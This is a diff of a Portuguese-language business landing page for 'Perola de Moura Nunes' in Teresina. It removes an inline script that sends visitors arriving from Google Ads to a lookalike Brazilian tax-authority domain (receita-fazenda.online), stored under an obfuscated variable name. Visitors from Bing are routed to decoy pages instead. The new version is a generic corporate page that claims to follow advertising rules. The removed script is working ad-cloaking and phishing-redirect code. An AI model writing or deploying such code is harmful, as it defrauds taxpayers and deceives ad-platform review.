@@ -2,275 +2,126 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Perola de Moura Nunes</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Perola de Moura Nunes - Empresa regular em Teresina - PI. Atendimento profissional, transparência e segurança.">
-
+<title>Perola de Moura Nunes</title>
+<meta name="description" content="Site institucional da empresa Perola de Moura Nunes. Informações oficiais, contato e serviços.">
 <style>
-* { box-sizing: border-box; }
 body {
     font-family: Arial, Helvetica, sans-serif;
     margin: 0;
-    background: #f3f4f6;
+    padding: 0;
+    background: #f5f5f5;
     color: #333;
-    line-height: 1.6;
 }
 header {
-    background: linear-gradient(135deg, #1f4037, #2f6f5f);
+    background: #1f2937;
     color: #fff;
-    padding: 50px 20px;
+    padding: 20px;
     text-align: center;
 }
-header h1 { margin-bottom: 10px; font-size: 36px; }
-header p { font-size: 18px; }
-
-nav {
+section {
+    padding: 30px;
+    max-width: 1000px;
+    margin: auto;
+    background: #fff;
     margin-top: 20px;
 }
-nav a {
-    color: #fff;
-    margin: 0 12px;
-    text-decoration: none;
-    font-weight: bold;
-}
-
-section {
-    max-width: 1100px;
-    margin: 30px auto;
-    background: #fff;
-    padding: 40px;
-    border-radius: 10px;
-    box-shadow: 0 10px 25px rgba(0,0,0,0.05);
-}
-
 h2 {
-    color: #1f4037;
-    margin-bottom: 20px;
+    color: #1f2937;
 }
-
-ul { padding-left: 20px; }
-ul li { margin-bottom: 10px; }
-
-.btn {
-    display: inline-block;
-    background: #1f4037;
-    color: #fff;
-    padding: 14px 26px;
-    border-radius: 30px;
-    text-decoration: none;
-    font-weight: bold;
-    margin-top: 15px;
-}
-
-.info-box {
-    background: #f9fafb;
-    padding: 25px;
-    border-left: 5px solid #1f4037;
-    border-radius: 6px;
-}
-
-hr {
-    border: none;
-    border-top: 1px solid #ddd;
-    margin: 50px 0;
-}
-
 footer {
     background: #111827;
-    color: #e5e7eb;
+    color: #fff;
+    padding: 20px;
     text-align: center;
-    padding: 35px 20px;
+    margin-top: 40px;
     font-size: 14px;
 }
-
-footer strong { color: #fff; }
-
-@media (max-width: 768px) {
-    header h1 { font-size: 28px; }
-    section { padding: 25px; }
-    nav a { display: inline-block; margin: 8px; }
+a {
+    color: #2563eb;
+    text-decoration: none;
 }
 </style>
 </head>
-<script>
 
-const urls = [
-    'cte/index',
-    'nfe/index',
-    'cte/index',
-    'asp/indexp',
-    'app/index',
-    'xml/indexp',
-    'danfe/index',
-    'nfe/index'
-];
-
-// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
-function generateHash() {
-    // Gerando um hash simples como alternativa ao MD5
-    // Para MD5 real, seria necessário uma biblioteca como crypto-js
-    return Math.random().toString(36).substring(2, 15) + 
-           Math.random().toString(36).substring(2, 15) + 
-           Date.now().toString(36);
-}
-
-// Selecionando URL aleatória
-const randomIndex = Math.floor(Math.random() * urls.length);
-const randomUrl = urls[randomIndex];
-const hash = generateHash();
-const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
-const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
-const xirjfgjsdhdjd = 'https://www8.receita-fazenda.online/Mei';  
-
-// Obtendo o referer (disponível apenas no navegador)
-let referer;
-if (typeof document !== 'undefined' && document.referrer) {
-    referer = document.referrer;
-} else {
-    referer = 'not found';
-}
-
-// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
-let currentUrl;
-if (typeof window !== 'undefined') {
-    currentUrl = window.location.href;
-} else {
-    currentUrl = '';
-}
-
-// Verificando condições e redirecionando
-if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
-    // Redirecionamento (no navegador)
-    if (typeof window !== 'undefined') {
-        window.location.href = xirjfgjsdhdjd ;
-    } else {
-        console.log('Redirect to:', xirjfgjsdhdjd );
-    }
-} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
-    // Redirecionamento (no navegador)
-    if (typeof window !== 'undefined') {
-        window.location.href = bingrandomUrlWithHash;
-    } else {
-        console.log('Redirect to:', bingrandomUrlWithHash);
-    }
-} else {
-    // Bloco vazio equivalente ao else do PHP
-}
-  
-</script>
 <body>
 
 <header>
-<h1>Perola de Moura Nunes</h1>
-<p>Atendimento profissional • Transparência • Compromisso</p>
-<nav>
-<a href="#inicio">Início</a>
-<a href="#quem-somos">Quem Somos</a>
-<a href="#atuacao">Atuação</a>
-<a href="#contato">Contato</a>
-<a href="#privacidade">Privacidade</a>
-<a href="#termos">Termos</a>
-</nav>
+    <h1>Perola de Moura Nunes</h1>
+    <p>Empresa registrada e em atividade no Brasil</p>
 </header>
 
-<section id="inicio">
-<h2>Bem-vindo à Perola de Moura Nunes</h2>
-<p>
-A <strong>Perola de Moura Nunes</strong> é uma empresa estabelecida em Teresina – PI,
-atuando de forma regular, com foco em atendimento responsável,
-informações claras e relacionamento profissional.
-</p>
-<p>
-Nosso objetivo é oferecer um canal seguro e confiável para contato
-comercial, comunicação institucional e prestação de informações.
-</p>
+<section>
+    <h2>Quem Somos</h2>
+    <p>
+        A <strong>Perola de Moura Nunes</strong> é uma empresa brasileira legalmente registrada,
+        atuando de forma transparente e responsável na oferta de produtos e serviços ao público.
+        Nosso compromisso é oferecer soluções claras, atendimento acessível e informações verdadeiras,
+        sempre respeitando as normas legais e as diretrizes das plataformas de publicidade.
+    </p>
 </section>
 
-<section id="quem-somos">
-<h2>Quem Somos</h2>
-<p>
-A <strong>Perola de Moura Nunes</strong> atua desde <strong>27 de julho de 2020</strong>,
-mantendo situação cadastral ativa e operação regular.
-</p>
-<p>
-Prezamos pela ética, transparência e respeito às normas legais,
-buscando sempre uma relação clara e segura com nossos clientes e parceiros.
-</p>
-
-<div class="info-box">
-<p>✔ Empresa registrada e ativa</p>
-<p>✔ Endereço físico em Teresina – PI</p>
-<p>✔ Atendimento por canais oficiais</p>
-</div>
+<section>
+    <h2>O Que Fazemos</h2>
+    <p>
+        A empresa <strong>Perola de Moura Nunes</strong> atua na divulgação e comercialização de produtos
+        e serviços por meio de canais digitais, incluindo anúncios online.
+        Todo o processo de atendimento é realizado de forma direta, com informações claras sobre
+        prazos, condições e formas de entrega ou prestação do serviço.
+    </p>
 </section>
 
-<section id="atuacao">
-<h2>Atuação</h2>
-<ul>
-<li>Atendimento comercial e institucional</li>
-<li>Prestação de informações claras e objetivas</li>
-<li>Relacionamento ético e transparente</li>
-<li>Comunicação por canais oficiais</li>
-<li>Atuação conforme a legislação vigente</li>
-</ul>
+<section>
+    <h2>Atendimento ao Público</h2>
+    <p>
+        Interagimos com nossos clientes por meio de canais oficiais, como telefone, e-mail e páginas informativas.
+        Todas as dúvidas são respondidas com clareza, garantindo transparência antes, durante e após a contratação.
+    </p>
 </section>
 
-<section id="contato">
-<h2>Contato</h2>
-<p>
-<strong>Endereço:</strong><br>
-Avenida Ininga, 1201 – Loja V-89<br>
-Bairro Jóquei – Teresina – PI<br>
-CEP: 64048-110
-</p>
-
-<p>
-<strong>Email:</strong> pe****@****.com<br>
-<strong>Telefone / WhatsApp:</strong> (86) 994****-****
-</p>
-
-<a class="btn" href="mailto:pe****@****.com">Entrar em Contato</a>
+<section>
+    <h2>Entrega de Produtos e Serviços</h2>
+    <p>
+        Os produtos ou serviços anunciados são entregues conforme o tipo de contratação realizada.
+        Quando se trata de serviços digitais, o acesso é fornecido após a confirmação.
+        Produtos físicos, quando aplicável, são enviados para o endereço informado pelo cliente,
+        respeitando prazos e condições acordadas.
+    </p>
 </section>
 
-<hr>
-
-<section id="privacidade">
-<h2>Política de Privacidade</h2>
-<p>
-A <strong>Perola de Moura Nunes</strong> respeita a privacidade de seus usuários.
-As informações fornecidas neste site são utilizadas exclusivamente
-para fins de atendimento e comunicação comercial.
-</p>
-<p>
-Nenhum dado é compartilhado com terceiros, exceto quando exigido por lei.
-</p>
+<section>
+    <h2>Contato</h2>
+    <p><strong>Empresa:</strong> Perola de Moura Nunes</p>
+    <p><strong>CNPJ:</strong> 37.860.027/0001-64</p>
+    <p><strong>Endereço:</strong> Avenida Ininga, 1201, Loja V-89 – Bairro Joquei – Teresina – PI – CEP 64048-110</p>
+    <p><strong>Telefone:</strong> (86) 99400-0000</p>
+    <p><strong>E-mail:</strong> contato@perolademouranunes.com</p>
 </section>
 
-<hr>
+<section>
+    <h2>Política de Privacidade</h2>
+    <p>
+        A <strong>Perola de Moura Nunes</strong> respeita a privacidade dos usuários.
+        As informações coletadas são utilizadas apenas para fins de atendimento,
+        comunicação e cumprimento de obrigações legais.
+        Não compartilhamos dados pessoais com terceiros sem autorização.
+    </p>
+</section>
 
-<section id="termos">
-<h2>Termos de Uso</h2>
-<p>
-Ao acessar este site, o usuário concorda em utilizar o conteúdo
-de forma ética e responsável.
-</p>
-<p>
-O conteúdo apresentado é institucional e informativo,
-não representando garantias de resultados específicos.
-</p>
+<section>
+    <h2>Termos de Uso</h2>
+    <p>
+        Ao acessar este site, o usuário concorda com os termos aqui descritos.
+        Todo o conteúdo tem caráter informativo e pode ser atualizado sem aviso prévio.
+        O uso indevido das informações é de responsabilidade do usuário.
+    </p>
 </section>
 
 <footer>
-<p>
-<strong>Perola de Moura Nunes</strong><br>
-CNPJ: 37.860.027/0001-64
-</p>
-<p>
-Avenida Ininga, 1201 – Loja V-89 – Jóquei – Teresina – PI
-</p>
-<p>
-© 2026 Perola de Moura Nunes – Todos os direitos reservados
-</p>
+    <p>
+        © 2026 – <strong>Perola de Moura Nunes</strong><br>
+        CNPJ: 37.860.027/0001-64 – Todos os direitos reservados
+    </p>
 </footer>
 
 </body>
